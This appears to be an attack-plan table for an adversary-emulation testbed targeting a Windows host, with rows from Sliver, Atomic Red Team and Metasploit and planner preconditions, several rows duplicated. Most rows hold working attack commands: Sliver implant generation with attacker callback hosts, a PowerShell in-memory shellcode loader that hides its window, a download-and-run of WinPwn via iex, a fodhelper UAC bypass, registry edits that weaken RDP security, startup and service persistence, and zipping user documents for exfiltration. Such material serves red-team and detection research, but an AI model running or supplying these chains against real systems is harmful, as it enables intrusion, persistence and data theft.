## Testbed Information
### Target Machine
- Machine ID: host11
    - OS: windows
    - CVE: []
## Attack Steps
| uuid | name | id | source | supported_platforms | tactics | technique | description | execution | arguments | preconditions | effects |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 2a602f8e-4d1f-49f1-b3b8-4b74f67cb63a | Build Shellcode for the Sliver implant (for Windows) | \['T1071.001'\] | Manual | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | The command is used in the Sliver C2 (Command and Control) framework to generate a shellcode payload designed for remote access to a target machine.<br> | {'executor': 'Sliver Console', 'command': 'sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shellcode --save #{SAVE_PATH}\nsliver > mtls --lport #{LPORT}\n'} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the generated payload', 'type': None}} | \['(os_windows ?target - host)', '(unallocated ?p - payload)', '(unallocated ?file - file)'\] | \['(sliver_implant_payload ?p - payload ?target - host)', '(shellcode_payload ?p - payload)', '(file_payload ?p - payload ?file - file)', '(bin_blob_file ?file - file)', '(file_prepared_local ?file - file)', '~(unallocated ?p - payload)', '~(unallocated ?file - file)'\] |
| 7480189e-1a4b-45f5-b225-c102915f7262 | Simulate the victim download a file on its machine | \['T1566.002'\] | Manual | \['windows'\] | \['Initial Access'\] | \['Phishing: Spearphishing Link'\] | This step simulates the victim accidentally downloads a malicious file by clicking a link. | {'executor': 'Human', 'command': "(This step needs human interaction and (temporarily) cannot be executed automatically)\n(On attacker's machine)\npython -m http.server\n\n(On victim's machine)\n1. Open #{LHOST}:#{LPORT} in the browser\n2. Navigate to the path of the file on the attacker's machine\n3. Download the file to #{PATH}\n"} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the downloaded payload', 'type': None}} | \['(file_prepared_local ?file - file)'\] | \['(file_exists ?path - path ?file - file ?t - host)'\] |
| 0617285b-6005-4a73-83c5-d4dc86fcdc35 | Simulate the victim executes a shellcode payload (Windows) | \['T1059.001', 'T1620'\] | Manual | \['windows'\] | \['Execution', 'Defense Evasion'\] | \['Command and Scripting Interpreter: PowerShell', 'Reflective Code Loading'\] | None | {'executor': 'Human', 'command': '(This step needs human interaction and (temporarily) cannot be executed automatically)\n(On victim\'s machine, open a powershell and execute these scripts)\n\n$s=\[System.IO.File\]::ReadAllBytes(\'#{SAVE_PATH}\');\n$c=\'using System;using System.Runtime.InteropServices;public class W{\[DllImport("kernel32")\]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);\[DllImport("kernel32")\]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);\[DllImport("kernel32")\]public static extern uint WaitForSingleObject(IntPtr a,uint b);\[DllImport("kernel32.dll")\]public static extern IntPtr GetConsoleWindow();\[DllImport("user32.dll")\]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);}\';Add-Type -TypeDefinition $c;$hwnd=\[W\]::GetConsoleWindow();if($hwnd -ne \[IntPtr\]::Zero){\[W\]::ShowWindow($hwnd,0)};\n$p=\[W\]::VirtualAlloc(0,$s.Length,0x3000,0x40);\n\[System.Runtime.InteropServices.Marshal\]::Copy($s,0,$p,$s.Length);\n$h=\[W\]::CreateThread(0,0,$p,0,0,0);\[W\]::WaitForSingleObject($h,0xFFFFFFFF)\n'} | {'SAVE_PATH': {'default': None, 'description': 'Saved path of the downloaded shellcode payload file', 'type': None}} | \['(file_exists ?path - path ?file - file ?t - host)', '(bin_blob_file ?file - file)'\] | \['(file_executed ?file - file ?t - host)'\] |
| 1f401bbe-de24-41d2-8e34-d026e25bfb94 | Execute a Sliver Implant Payload | \['T1071.001'\] | Sliver | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | Executing a Sliver implant payload will establish a Sliver session.<br> | {'executor': 'None', 'command': 'None\n'} | None | \['(sliver_implant_payload ?p - payload ?t - host)', '(file_payload ?p - payload ?f - file)', '(file_executed ?f - file ?t - host)', '(unallocated ?s - executor)'\] | \['(sliver_session ?s - executor ?t - host)', '~(unallocated ?s - executor)', {'operator': 'When', 'params': {'condition': '(file_executed_as_root ?f - file ?t - host)', 'effect': '(elevated_executor ?s - executor)'}}\] |
| 7bfba376-cebc-4094-b1e6-5103b2e83c4e | Execute PowerShell Command | \['T1059.001'\] | Sliver | \['windows'\] | \['Execution'\] | \['Command and Scripting Interpreter: PowerShell\n'\] | The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine. | {'executor': 'Sliver Executor', 'command': 'powershell(#{SessionID},#{Commands})'} | {'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \['(os_windows ?t - host)', '(sliver_session ?s1 - executor ?t - host)'\] | \['(powershell ?s2 - executor ?t - host)', {'operator': 'When', 'params': {'condition': '(elevated_executor ?s1 - executor)', 'effect': '(elevated_executor ?s2 - executor)'}}\] |
| 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed | WinPwn - General privesc checks | \['T1082'\] | ART | \['windows'\] | \['Discovery'\] | \['System Information Discovery'\] | General privesc checks using the otherchecks function of WinPwn | {'executor': 'Powershell Executor', 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput"} | None | \['(powershell ?executor - executor ?target - host)', '(os_windows ?target - host)'\] | \['(system_time_info_known ?target - host)'\] |
| 3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8 | Enumerate Active Directory Groups with Get-AdGroup | \['T1069.002'\] | ART | \['windows'\] | \['Discovery'\] | \['Permission Groups Discovery: Domain Groups'\] | The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.<br>Upon successful execution a listing of groups will output with their paths in AD.<br>Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps<br> | {'executor': 'Powershell Executor', 'command': 'Get-AdGroup -Filter *\n'} | None | \['(powershell ?executor - executor ?target - host)', '(os_windows ?target - host)'\] | \['(local_permission_groups_info_known ?target - host)'\] |
| bc50eb97-4a6d-4a9d-b0b2-e9cf623a9106 | Build the executable file (service) of a Sliver implant (for Windows) | \['T1071.001'\] | Manual | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | The command is used in the Sliver C2 (Command and Control) framework to generate a service executable payload designed for remote access to a target machine.<br> | {'executor': 'Sliver Console', 'command': 'sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format service --save #{SAVE_PATH}\nsliver > mtls --lport #{LPORT}\n'} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the generated payload', 'type': None}} | \['(os_windows ?target - host)', '(unallocated ?p - payload)', '(unallocated ?file - file)'\] | \['(sliver_implant_payload ?p - payload ?target - host)', '(service_payload ?p - payload)', '(file_payload ?p - payload ?file - file)', '(file_prepared_local ?file - file)', '(exe_file ?file - file)', '~(unallocated ?p - payload)', '~(unallocated ?file - file)'\] |
| 7480189e-1a4b-45f5-b225-c102915f7262 | Simulate the victim download a file on its machine | \['T1566.002'\] | Manual | \['windows'\] | \['Initial Access'\] | \['Phishing: Spearphishing Link'\] | This step simulates the victim accidentally downloads a malicious file by clicking a link. | {'executor': 'Human', 'command': "(This step needs human interaction and (temporarily) cannot be executed automatically)\n(On attacker's machine)\npython -m http.server\n\n(On victim's machine)\n1. Open #{LHOST}:#{LPORT} in the browser\n2. Navigate to the path of the file on the attacker's machine\n3. Download the file to #{PATH}\n"} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the downloaded payload', 'type': None}} | \['(file_prepared_local ?file - file)'\] | \['(file_exists ?path - path ?file - file ?t - host)'\] |
| 8834b65a-f808-4ece-ad7e-2acdf647aafa | Change Startup Folder - HKCU Modify User Shell Folders Startup Value | \['T1547.001'\] | ART | \['windows'\] | \['Persistence', 'Privilege Escalation'\] | \['Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'\] | This test will modify the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders  -V "Startup" value <br>to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart<br> | {'executor': 'Powershell Executor', 'command': 'New-Item -ItemType Directory -path "#{new_startup_folder}"\nCopy-Item -path "#{payload}" -destination "#{new_startup_folder}"\nSet-ItemProperty -Path  "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" -Name "Startup" -Value "#{new_startup_folder}"\n'} | {'new_startup_folder': {'description': 'new startup folder to replace standard one', 'type': 'string', 'default': '$env:TMP\\atomictest\\'}, 'payload': {'description': 'executable to be placed in new startup location ', 'type': 'string', 'default': 'C:\\Windows\\System32\\calc.exe'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)', '(file_exists ?payload - path ?file - file ?target - host)', '(exe_file ?file - file)'\] | \['(file_execution_at_startup ?file - file ?target - host)'\] |
| f7f31777-1bbf-4ddc-b7a1-af9f46a5299b | Obtain a persistent Sliver Executor | \[None\] | Manual | \['windows', 'linux', 'macos'\] | \['Persistence'\] | \[None\] | Obtain the persistency of Sliver Executor via scheduled payload file execution.<br> | {'executor': 'None', 'command': 'None\n'} | None | \['(sliver_implant_payload ?p - payload ?target - host)', '(file_payload ?p - payload ?f - file)', {'operator': 'or', 'operands': \['(file_execution_at_time ?f - file ?target - host)', '(file_execution_at_startup ?f - file ?target - host)'\]}, '(unallocated ?s - executor)'\] | \['(persistent_sliver_session ?s - executor ?target - host)', '~(unallocated ?s - executor)'\] |
| d3d9af44-b8ad-4375-8b0a-4bff4b7e419c | Search files of interest and save them to a single zip file (Windows) | \['T1005'\] | ART | \['windows'\] | \['Collection'\] | \['Data from Local System'\] | This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              <br> | {'executor': 'Powershell Executor', 'command': '$startingDirectory = "C:"\n$outputZip = "#{output_zip_folder_path}"\n$fileExtensionsString = ".doc, .docx, .txt" \n$fileExtensions = $fileExtensionsString -split ", "\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    \[string\]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\\data.zip"\n\n  Write-Host "Zip file created: $outputZip\\data.zip"\n  } else {\n      Write-Host "No files found with the specified extensions."\n  }\n'} | {'output_zip_folder_path': {'description': 'Path to directory for saving the generated zip file', 'type': 'Path', 'default': 'PathToAtomicsFolder\\..\\ExternalPayloads\\T1005'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)'\] | \['(certain_extension_data_saved ?file - file ?target - host)', '(file_exists ?output_zip_folder_path - path ?file - file ?target - host)', '(zip_file ?file - file)'\] |
| 2e8f1a9c-0b5e-4a7c-b6d4-9a8b2d3c5f1e | Create Directory | \['T1106'\] | Sliver | \['windows', 'linux'\] | \['Persistence'\] | \['File System Permissions Modification'\] | The `mkdir` command creates a new directory on the target system. | {'executor': 'Sliver Executor', 'command': 'mkdir (#{remote_path},#{SessionID})'} | {'remote_path': {'description': 'Full path of the directory to create'}, 'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \[{'operator': 'or', 'operands': \['(os_windows ?target - host)', '(os_linux ?target - host)'\]}, '(sliver_session ?executorID - executor ?target - host)'\] | \['(dir_exists ?path - path ?dir - dir ?target - host)'\] |
| a57fbe4b-3440-452a-88a7-943531ac872a | Zip a Folder with PowerShell for Staging in Temp | \['T1074.001'\] | ART | \['windows'\] | \['Collection'\] | \['Data Staged: Local Data Staging'\] | Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip<br>was placed in the temp directory.<br> | {'executor': 'Powershell Executor', 'command': 'Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force\n'} | {'output_file': {'description': 'Location to save zipped file or folder', 'type': 'path', 'default': None}, 'input_file': {'description': 'Location of file or folder to zip', 'type': 'path', 'default': None}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)', '(dir_exists ?input_file - path ?dir - dir ?target - host)'\] | \['(dir_data_saved ?dir - dir ?file - file)', '(file_exists ?output_file - path ?file - file ?target - host)', '(zip_file ?file - file)'\] |
| 2074d817-7819-401b-b552-1045672f77f3 | Execute Command (cmd.exe) | \['T1059.003'\] | Sliver | \['windows'\] | \['Execution'\] | \['Command and Scripting Interpreter: Windows Command Shell\n'\] | The `cmd.exe` command executes a Windows command. It runs the specified command on the remote host and returns the result. This command is useful for performing various system tasks. | {'executor': 'Sliver Executor', 'command': 'cmd(#{SessionID},#{Commands})'} | {'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \['(os_windows ?t - host)', '(sliver_session ?s1 - executor ?t - host)'\] | \['(command_prompt ?s2 - executor ?t - host)', {'operator': 'When', 'params': {'condition': '(elevated_executor ?s1 - executor)', 'effect': '(elevated_executor ?s2 - executor)'}}\] |
| 4b81bcfa-fb0a-45e9-90c2-e3efe5160140 | Disable Remote Desktop Security Settings Through Registry | \['T1112'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Modify Registry'\] | A modification registry to disable RDP security settings. This technique was seen in DarkGate malware as part of its installation<br> | {'executor': 'Command Prompt Executor', 'command': 'reg add "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(os_windows ?target - host)'\] | \['(rdp_security_settings_disabled ?target - host)'\] |
| 0cc88118-410f-49e5-aa53-3726df4c8d48 | Simulate the victim accidentally creates a new service based on a service payload file | \['T1204.002', 'T1543.003'\] | Manual | \['windows'\] | \['Execution', 'Persistence'\] | \['User Execution: Malicious File', 'Create or Modify System Process: Windows Service'\] | None | {'executor': 'Human', 'command': '(This step needs human interaction and (temporarily) cannot be executed automatically)\n(On victim\'s machine, open a powershell as the administrator and run the following commands)\n\nsc create sliver_svc binPath= "#{SAVE_PATH}" start= auto\nsc start sliver_svc\n'} | {'SAVE_PATH': {'default': None, 'description': 'Saved path of the service executable payload file', 'type': None}} | \['(service_payload ?p - payload)', '(file_payload ?p - payload ?file - file)', '(file_exists ?path - path ?file - file ?t - host)'\] | \['(file_executed ?file - file ?t - host)'\] |
| 3f627297-6c38-4e7d-a278-fc2563eaaeaa | Bypass UAC using Fodhelper - PowerShell | \['T1548.002'\] | ART | \['windows'\] | \['Defense Evasion', 'Privilege Escalation'\] | \['Abuse Elevation Control Mechanism: Bypass User Account Control'\] | PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.<br>Upon execution command prompt will be opened.<br> | {'executor': 'Powershell Executor', 'command': 'New-Item "HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" -Force\nNew-ItemProperty "HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force\nSet-ItemProperty "HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" -Name "(default)" -Value "#{executable_binary}" -Force\nStart-Process "C:\\Windows\\System32\\fodhelper.exe"\n'} | {'executable_binary': {'description': 'Binary to execute with UAC Bypass', 'type': 'path', 'default': 'C:\\Windows\\System32\\cmd.exe'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)', '(file_exists ?executable_binary - path ?file - file ?target - host)', {'operator': 'or', 'operands': \['(exe_file ?file - file)'\]}\] | \['(file_executed_as_root ?file - file ?target - host)'\] |
| 1f401bbe-de24-41d2-8e34-d026e25bfb94 | Execute a Sliver Implant Payload | \['T1071.001'\] | Sliver | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | Executing a Sliver implant payload will establish a Sliver session.<br> | {'executor': 'None', 'command': 'None\n'} | None | \['(sliver_implant_payload ?p - payload ?t - host)', '(file_payload ?p - payload ?f - file)', '(file_executed ?f - file ?t - host)', '(unallocated ?s - executor)'\] | \['(sliver_session ?s - executor ?t - host)', '~(unallocated ?s - executor)', {'operator': 'When', 'params': {'condition': '(file_executed_as_root ?f - file ?t - host)', 'effect': '(elevated_executor ?s - executor)'}}\] |
| 2074d817-7819-401b-b552-1045672f77f3 | Execute Command (cmd.exe) | \['T1059.003'\] | Sliver | \['windows'\] | \['Execution'\] | \['Command and Scripting Interpreter: Windows Command Shell\n'\] | The `cmd.exe` command executes a Windows command. It runs the specified command on the remote host and returns the result. This command is useful for performing various system tasks. | {'executor': 'Sliver Executor', 'command': 'cmd(#{SessionID},#{Commands})'} | {'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \['(os_windows ?t - host)', '(sliver_session ?s1 - executor ?t - host)'\] | \['(command_prompt ?s2 - executor ?t - host)', {'operator': 'When', 'params': {'condition': '(elevated_executor ?s1 - executor)', 'effect': '(elevated_executor ?s2 - executor)'}}\] |
| 3e757ce7-eca0-411a-9583-1c33b8508d52 | Windows HideSCANetwork Group Policy Feature | \['T1112'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Modify Registry'\] | Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. <br>Take note that some Group Policy changes might require a restart to take effect.<br>See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details<br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(networking_icon_group_policy_disabled ?target - host)'\] |
| 003f466a-6010-4b15-803a-cbb478a314d7 | Disable Windows Toast Notifications | \['T1112'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Modify Registry'\] | Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.<br>See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/<br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(toast_notification_disabled ?target - host)'\] |
| bb2176c4-855e-4b52-ab03-5fe2e58d8129 | Build DLL Sliver implant | \['T1071.001'\] | Manual | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.<br> | {'executor': 'Sliver Console', 'command': 'sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}\nsliver > mtls --lport #{LPORT}\n'} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the generated payload', 'type': None}} | \['(os_windows ?target - host)', '(unallocated ?p - payload)', '(unallocated ?file - file)'\] | \['(sliver_implant_payload ?p - payload ?target - host)', '(file_payload ?p - payload ?file - file)', '(dll_file ?file - file)', '(file_prepared_local ?file - file)', '~(unallocated ?p - payload)', '~(unallocated ?file - file)'\] |
| d3d9af44-b8ad-4375-8b0a-4bff4b7e419c | Search files of interest and save them to a single zip file (Windows) | \['T1005'\] | ART | \['windows'\] | \['Collection'\] | \['Data from Local System'\] | This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              <br> | {'executor': 'Powershell Executor', 'command': '$startingDirectory = "C:"\n$outputZip = "#{output_zip_folder_path}"\n$fileExtensionsString = ".doc, .docx, .txt" \n$fileExtensions = $fileExtensionsString -split ", "\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    \[string\]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\\data.zip"\n\n  Write-Host "Zip file created: $outputZip\\data.zip"\n  } else {\n      Write-Host "No files found with the specified extensions."\n  }\n'} | {'output_zip_folder_path': {'description': 'Path to directory for saving the generated zip file', 'type': 'Path', 'default': 'PathToAtomicsFolder\\..\\ExternalPayloads\\T1005'}} | \['(os_windows ?target - host)', '(powershell ?executor - executor ?target - host)'\] | \['(certain_extension_data_saved ?file - file ?target - host)', '(file_exists ?output_zip_folder_path - path ?file - file ?target - host)', '(zip_file ?file - file)'\] |
| 7bfba376-cebc-4094-b1e6-5103b2e83c4e | Execute PowerShell Command | \['T1059.001'\] | Sliver | \['windows'\] | \['Execution'\] | \['Command and Scripting Interpreter: PowerShell\n'\] | The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine. | {'executor': 'Sliver Executor', 'command': 'powershell(#{SessionID},#{Commands})'} | {'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \['(os_windows ?t - host)', '(sliver_session ?s1 - executor ?t - host)'\] | \['(powershell ?s2 - executor ?t - host)', {'operator': 'When', 'params': {'condition': '(elevated_executor ?s1 - executor)', 'effect': '(elevated_executor ?s2 - executor)'}}\] |
| 1f401bbe-de24-41d2-8e34-d026e25bfb94 | Execute a Sliver Implant Payload | \['T1071.001'\] | Sliver | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | Executing a Sliver implant payload will establish a Sliver session.<br> | {'executor': 'None', 'command': 'None\n'} | None | \['(sliver_implant_payload ?p - payload ?t - host)', '(file_payload ?p - payload ?f - file)', '(file_executed ?f - file ?t - host)', '(unallocated ?s - executor)'\] | \['(sliver_session ?s - executor ?t - host)', '~(unallocated ?s - executor)', {'operator': 'When', 'params': {'condition': '(file_executed_as_root ?f - file ?t - host)', 'effect': '(elevated_executor ?s - executor)'}}\] |
| 1f401bbe-de24-41d2-8e34-d026e25bfb94 | Execute a Sliver Implant Payload | \['T1071.001'\] | Sliver | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | Executing a Sliver implant payload will establish a Sliver session.<br> | {'executor': 'None', 'command': 'None\n'} | None | \['(sliver_implant_payload ?p - payload ?t - host)', '(file_payload ?p - payload ?f - file)', '(file_executed ?f - file ?t - host)', '(unallocated ?s - executor)'\] | \['(sliver_session ?s - executor ?t - host)', '~(unallocated ?s - executor)', {'operator': 'When', 'params': {'condition': '(file_executed_as_root ?f - file ?t - host)', 'effect': '(elevated_executor ?s - executor)'}}\] |
| bb2176c4-855e-4b52-ab03-5fe2e58d8129 | Build DLL Sliver implant | \['T1071.001'\] | Manual | \['windows'\] | \['Command and Control'\] | \['Application Layer Protocol - Web Protocols'\] | The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.<br> | {'executor': 'Sliver Console', 'command': 'sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}\nsliver > mtls --lport #{LPORT}\n'} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the generated payload', 'type': None}} | \['(os_windows ?target - host)', '(unallocated ?p - payload)', '(unallocated ?file - file)'\] | \['(sliver_implant_payload ?p - payload ?target - host)', '(file_payload ?p - payload ?file - file)', '(dll_file ?file - file)', '(file_prepared_local ?file - file)', '~(unallocated ?p - payload)', '~(unallocated ?file - file)'\] |
| 19301991-c518-46ca-a622-378e1be4f1ad | Simulate the victim download and execute malicious payload file as Admin (Root) | \['T1204.002'\] | Manual | \['windows'\] | \['Execution'\] | \['User Execution: Malicious File'\] | None | {'executor': 'Human', 'command': "(This step needs human interaction and (temporarily) cannot be executed automatically)\n(On attacker's machine)\npython -m http.server\n\n(On victim's machine)\n1. Open #{LHOST}:#{LPORT} in the browser\n2. Navigate to the path of the target payload file\n3. Download the payload file\n4. Execute the payload file to #{PATH} as Admin (Root)\n"} | {'HOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the downloaded payload', 'type': None}} | \['(file_prepared_local ?file - file)', '(exe_file ?file - file)', '(unallocated ?path - path)'\] | \['(file_exists ?path - path ?file - file ?t - host)', '(file_executed ?file - file ?t - host)', '(file_executed_as_root ?f - file ?t - host)', '~(unallocated ?path - path)'\] |
| b52e0d1e-a1d2-4299-9a38-cb9d2a7c8ce0 | Upload to Remote Path | \['T1105'\] | Sliver | \['windows', 'linux', 'macos'\] | \['Command and Control'\] | \['Ingress Tool Transfer'\] | The `upload <remote_path, data, is_ioc>` function writes data to the specified path on the remote file system. Parameters include remote_path (remote path), data (data to write), and is_ioc (data is an indicator of compromise). | {'executor': 'Sliver Executor', 'command': 'upload(#{RemotePath}, #{Data}, #{IsIOC})\n'} | {'RemotePath': {'description': 'Remote path'}, 'Data': {'description': 'Data to write'}, 'IsIOC': {'description': 'Data is an indicator of compromise'}} | \[{'operator': 'or', 'operands': \['(os_windows ?t - host)', '(os_linux ?t - host)', '(os_macos ?t - host)'\]}, '(sliver_session ?s - executor ?t - host)', '(file_prepared_local ?file - file)'\] | \['(file_exists ?path - path ?file - file ?t - host)'\] |
| 08f66886-0e96-455b-be31-b0af37db8e23 | Set a universal payload handler using MSF exploit/multi/handler module | \['T1071.001'\] | Manual | \['windows'\] | \['Execution', 'Command and Control'\] | \['Windows Command Shell', 'Ingress Tool Transfer', 'Non-Standard Por'\] | In Metasploit, the exploit/multi/handler module is essentially a universal payload handler.<br>Unlike most exploit modules in Metasploit that target specific vulnerabilities, multi/handler does not exploit a particular service or software.<br>Instead, its main purpose is to listen for incoming connections from payloads that you have already delivered to a target by some other means.<br> | {'executor': 'Metasploit Executor', 'command': 'exploit_and_execute_payload(target = None,\n                            exploit_module_name = "exploit/multi/handler",\n                            payload_module_name = "#{payload_name}",\n                            listening_host = "#{LHOST}",\n                            listening_port = "#{LPORT}"):\n'} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'payload_name': {'default': None, 'description': 'payload type set by msf', 'type': None}} | None | \['(payload_handler_set ?p - payload)'\] |
| b8cbd2a9-6967-4114-b2b5-162098f74a89 | Take Screenshot | \['T1113'\] | Sliver | \['windows', 'linux', 'macos'\] | \['Collection'\] | \['Screen Capture'\] | The `screenshot()` function takes a screenshot of the remote system with screenshot data in PNG format. | {'executor': 'Sliver Executor', 'command': 'screenshot(#{SessionID})'} | {'SessionID': {'default': None, 'description': 'The session ID of the active Sliver connection.', 'type': None}} | \[{'operator': 'or', 'operands': \['(os_windows ?t - host)', '(os_linux ?t - host)', '(os_macos ?t - host)'\]}, '(sliver_session ?s - executor ?t - host)'\] | \['(screenshot_data_saved ?file - file ?t - host)', '(file_exists ?path - path ?file - file ?t - host)'\] |
| 7480189e-1a4b-45f5-b225-c102915f7262 | Simulate the victim download a file on its machine | \['T1566.002'\] | Manual | \['windows'\] | \['Initial Access'\] | \['Phishing: Spearphishing Link'\] | This step simulates the victim accidentally downloads a malicious file by clicking a link. | {'executor': 'Human', 'command': "(This step needs human interaction and (temporarily) cannot be executed automatically)\n(On attacker's machine)\npython -m http.server\n\n(On victim's machine)\n1. Open #{LHOST}:#{LPORT} in the browser\n2. Navigate to the path of the file on the attacker's machine\n3. Download the file to #{PATH}\n"} | {'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'listening port of the attacter machine', 'type': None}, 'SAVE_PATH': {'default': None, 'description': 'Saved path of the downloaded payload', 'type': None}} | \['(file_prepared_local ?file - file)'\] | \['(file_exists ?path - path ?file - file ?t - host)'\] |
